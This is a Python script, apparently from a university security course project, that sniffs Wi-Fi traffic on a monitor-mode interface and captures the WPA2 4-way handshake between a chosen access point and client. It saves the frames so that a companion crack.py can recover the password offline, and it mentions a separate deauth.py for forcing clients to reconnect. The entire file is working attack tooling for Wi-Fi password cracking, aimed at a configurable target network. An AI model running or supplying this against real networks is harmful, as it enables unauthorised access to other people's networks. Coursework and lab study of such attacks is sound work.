#!/usr/bin/env python3
"""
capture.py  --  CSE 406 Project (Topic 20)

Passively sniffs 802.11 traffic on a monitor-mode interface, watches for the
WPA2 4-way handshake (EAPOL-Key frames) of a client naturally (re)associating
with the target AP, and saves the relevant frames to a .cap file once at
least Msg1+Msg2 has been seen for one client -- enough for crack.py to attack
offline.

Purely passive: this script never sends a deauthentication/disassociation
frame, and does not invoke deauth.py. If no client reconnects on its own, it
just keeps waiting -- run deauth.py yourself, separately, if you want that
sped up.

All settings come from config.py: INTERFACE (via MONITOR_INTERFACE), BSSID,
CHANNEL, CAPTURE_FILE, and optionally CLIENT_MAC. If CLIENT_MAC is set, only
that client's EAPOL exchange is captured; if left empty, the first client
seen completing Msg1+Msg2 with the target BSSID is used.

Run:
    sudo python3 capture.py
"""

from scapy.all import sniff, wrpcap, Dot11, EAPOL
import subprocess
import sys
import time

import config
from handshake import classify_message

# ---- configuration (see config.py) -------------------------------------
INTERFACE = config.MONITOR_INTERFACE
BSSID = config.BSSID.lower()
CHANNEL = config.CHANNEL
CLIENT_MAC = config.CLIENT_MAC.lower() if config.CLIENT_MAC else None
OUTFILE = str(config.CAPTURE_FILE)
GRACE_PERIOD_SEC = 5   # after Msg1+Msg2, keep listening this long for Msg3/Msg4 too
# -----------------------------------------------------------------------

collected = []          # EAPOL packets belonging to the chosen client
seen_by_sta = {}         # sta_mac -> set of message numbers (1-4) seen so far
target_sta = None        # the client we've committed to, once Msg1+Msg2 is seen
target_ready_at = None   # time.time() when that happened


def station_mac(pkt):
    """Return the non-AP address of this frame if it's traffic directly
    between our target BSSID and one station, else None."""
    to_ds = bool(pkt.FCfield & 0x1)
    from_ds = bool(pkt.FCfield & 0x2)
    addr1 = (pkt.addr1 or "").lower()
    addr2 = (pkt.addr2 or "").lower()
    if to_ds and not from_ds and addr1 == BSSID:      # station -> AP
        return addr2
    if from_ds and not to_ds and addr2 == BSSID:      # AP -> station
        return addr1
    return None


def set_channel():
    """Best-effort: put the monitor interface on the target's channel."""
    if not CHANNEL:
        return
    result = subprocess.run(
        ["iw", "dev", INTERFACE, "set", "channel", str(CHANNEL)],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(f"[!] Could not set channel {CHANNEL} on {INTERFACE}: {result.stderr.strip()}")
        print(f"    Set it manually: sudo iw dev {INTERFACE} set channel {CHANNEL}")
    else:
        print(f"[*] {INTERFACE} set to channel {CHANNEL}")


def process(pkt):
    """Called by sniff() for every packet. Track EAPOL messages per client."""
    global target_sta, target_ready_at

    if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
        return

    sta = station_mac(pkt)
    if sta is None:
        return
    if CLIENT_MAC and sta != CLIENT_MAC:
        return  # filtering to one specific client, and this isn't it

    raw = bytes(pkt[EAPOL])
    if len(raw) < 7:
        return
    key_info = (raw[5] << 8) | raw[6]
    msg = classify_message(key_info)
    if not msg:
        return

    collected.append(pkt)
    seen = seen_by_sta.setdefault(sta, set())
    seen.add(msg)
    print(f"[+] Msg{msg}/4 from {sta}  (have {sorted(seen)}/4 for this client)")

    if target_sta is None and {1, 2}.issubset(seen):
        target_sta = sta
        target_ready_at = time.time()
        print(
            f"[+] Msg1+Msg2 complete for {sta} -- enough to crack. "
            f"Waiting up to {GRACE_PERIOD_SEC}s more for Msg3/Msg4 confirmation..."
        )


def should_stop(pkt):
    if target_sta is None:
        return False
    if {3, 4}.issubset(seen_by_sta.get(target_sta, set())):
        return True
    return (time.time() - target_ready_at) >= GRACE_PERIOD_SEC


def main():
    who = config.CLIENT_MAC if CLIENT_MAC else "any client"
    print(f"[*] Passive monitor on {INTERFACE} for BSSID {config.BSSID} ({who})")
    set_channel()
    print("[*] Waiting for a client to (re)connect naturally -- no deauth frames are sent.")

    # store=False -> don't keep every packet in memory, only what we append.
    sniff(iface=INTERFACE, prn=process, stop_filter=should_stop, store=False)

    if target_sta is None:
        print("[-] Stopped without capturing a full Msg1+Msg2 handshake.")
        sys.exit(1)

    wrpcap(OUTFILE, collected)
    complete = {3, 4}.issubset(seen_by_sta.get(target_sta, set()))
    print(
        f"[+] Saved {len(collected)} EAPOL frame(s) to {OUTFILE} for client "
        f"{target_sta} ({'complete 4-way' if complete else 'Msg1+Msg2 only'})"
    )


if __name__ == "__main__":
    main()
